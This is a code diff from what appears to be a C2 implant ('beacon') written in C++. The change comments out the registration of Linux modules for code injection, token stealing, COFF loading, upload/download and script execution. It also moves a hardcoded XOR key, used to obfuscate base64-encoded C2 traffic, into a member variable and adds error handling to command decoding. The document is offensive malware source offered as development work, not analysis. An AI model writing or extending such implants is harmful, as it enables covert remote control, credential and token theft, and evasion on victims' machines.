@@ -95,52 +95,53 @@ Beacon::Beacon(const std::string& ip, int port)
 
 	srand(time(NULL));
 
-#ifdef __linux__
+// TODO at some point chose which module are directly included 
+// #ifdef __linux__
 
-	std::unique_ptr<AssemblyExec> assemblyExec = std::make_unique<AssemblyExec>();
-	m_moduleCmd.push_back(std::move(assemblyExec));
+// 	std::unique_ptr<AssemblyExec> assemblyExec = std::make_unique<AssemblyExec>();
+// 	m_moduleCmd.push_back(std::move(assemblyExec));
 
-	std::unique_ptr<Upload> upload = std::make_unique<Upload>();
-	m_moduleCmd.push_back(std::move(upload));
+// 	std::unique_ptr<Upload> upload = std::make_unique<Upload>();
+// 	m_moduleCmd.push_back(std::move(upload));
 
-	std::unique_ptr<Run> run = std::make_unique<Run>();
-	m_moduleCmd.push_back(std::move(run));
+// 	std::unique_ptr<Run> run = std::make_unique<Run>();
+// 	m_moduleCmd.push_back(std::move(run));
 
-	std::unique_ptr<Download> download = std::make_unique<Download>();
-	m_moduleCmd.push_back(std::move(download));
+// 	std::unique_ptr<Download> download = std::make_unique<Download>();
+// 	m_moduleCmd.push_back(std::move(download));
 
-	std::unique_ptr<Inject> inject = std::make_unique<Inject>();
-	m_moduleCmd.push_back(std::move(inject));
+// 	std::unique_ptr<Inject> inject = std::make_unique<Inject>();
+// 	m_moduleCmd.push_back(std::move(inject));
 	
-	std::unique_ptr<Script> script = std::make_unique<Script>();
-	m_moduleCmd.push_back(std::move(script));
+// 	std::unique_ptr<Script> script = std::make_unique<Script>();
+// 	m_moduleCmd.push_back(std::move(script));
 
-	std::unique_ptr<PrintWorkingDirectory> printWorkingDirectory = std::make_unique<PrintWorkingDirectory>();
-	m_moduleCmd.push_back(std::move(printWorkingDirectory));
+// 	std::unique_ptr<PrintWorkingDirectory> printWorkingDirectory = std::make_unique<PrintWorkingDirectory>();
+// 	m_moduleCmd.push_back(std::move(printWorkingDirectory));
 
-	std::unique_ptr<ChangeDirectory> changeDirectory = std::make_unique<ChangeDirectory>();
-	m_moduleCmd.push_back(std::move(changeDirectory));
+// 	std::unique_ptr<ChangeDirectory> changeDirectory = std::make_unique<ChangeDirectory>();
+// 	m_moduleCmd.push_back(std::move(changeDirectory));
 
-	std::unique_ptr<ListDirectory> listDirectory = std::make_unique<ListDirectory>();
-	m_moduleCmd.push_back(std::move(listDirectory));
+// 	std::unique_ptr<ListDirectory> listDirectory = std::make_unique<ListDirectory>();
+// 	m_moduleCmd.push_back(std::move(listDirectory));
 
-	std::unique_ptr<ListProcesses> listProcesses = std::make_unique<ListProcesses>();
-	m_moduleCmd.push_back(std::move(listProcesses));
+// 	std::unique_ptr<ListProcesses> listProcesses = std::make_unique<ListProcesses>();
+// 	m_moduleCmd.push_back(std::move(listProcesses));
 
-	std::unique_ptr<MakeToken> makeToken = std::make_unique<MakeToken>();
-	m_moduleCmd.push_back(std::move(makeToken));
+// 	std::unique_ptr<MakeToken> makeToken = std::make_unique<MakeToken>();
+// 	m_moduleCmd.push_back(std::move(makeToken));
 	
-	std::unique_ptr<Rev2self> rev2self = std::make_unique<Rev2self>();
-	m_moduleCmd.push_back(std::move(rev2self));
+// 	std::unique_ptr<Rev2self> rev2self = std::make_unique<Rev2self>();
+// 	m_moduleCmd.push_back(std::move(rev2self));
 
-	std::unique_ptr<StealToken> stealToken = std::make_unique<StealToken>();
-	m_moduleCmd.push_back(std::move(stealToken));
+// 	std::unique_ptr<StealToken> stealToken = std::make_unique<StealToken>();
+// 	m_moduleCmd.push_back(std::move(stealToken));
 
-	std::unique_ptr<CoffLoader> coffLoader = std::make_unique<CoffLoader>();
-	m_moduleCmd.push_back(std::move(coffLoader));
+// 	std::unique_ptr<CoffLoader> coffLoader = std::make_unique<CoffLoader>();
+// 	m_moduleCmd.push_back(std::move(coffLoader));
 
-#elif _WIN32
-#endif
+// #elif _WIN32
+// #endif
 
 #ifdef __linux__
 
@@ -256,15 +257,25 @@ Beacon::Beacon(const std::string& ip, int port)
 		m_privilege = "HIGH";
 
 #endif
+	// TODO put as a param comming from conf
+	m_key="dfsdgferhzdzxczevre5595485sdg";
 }
 
 
 // Distribute commands from C2 adress to this beacon and child beacons
 bool Beacon::cmdToTasks(const std::string& input)
 {
-	std::string key="dfsdgferhzdzxczevre5595485sdg";
-	std::string data = base64_decode(input);
-	XOR(data, key);
+	std::string data;
+	try
+	{
+		data = base64_decode(input);
+	} 
+	catch (...)
+	{
+		return false;
+	}
+
+	XOR(data, m_key);
 
 	MultiBundleC2Message multiBundleC2Message;
 	multiBundleC2Message.ParseFromArray(data.data(), (int)data.size());
@@ -363,8 +374,7 @@ bool Beacon::taskResultsToCmd(std::string& output)
 	std::string data;
 	multiBundleC2Message.SerializeToString(&data);
 
-	std::string key="dfsdgferhzdzxczevre5595485sdg";
-	XOR(data, key);
+	XOR(data, m_key);
 	output = base64_encode(data);
 
 	return true;
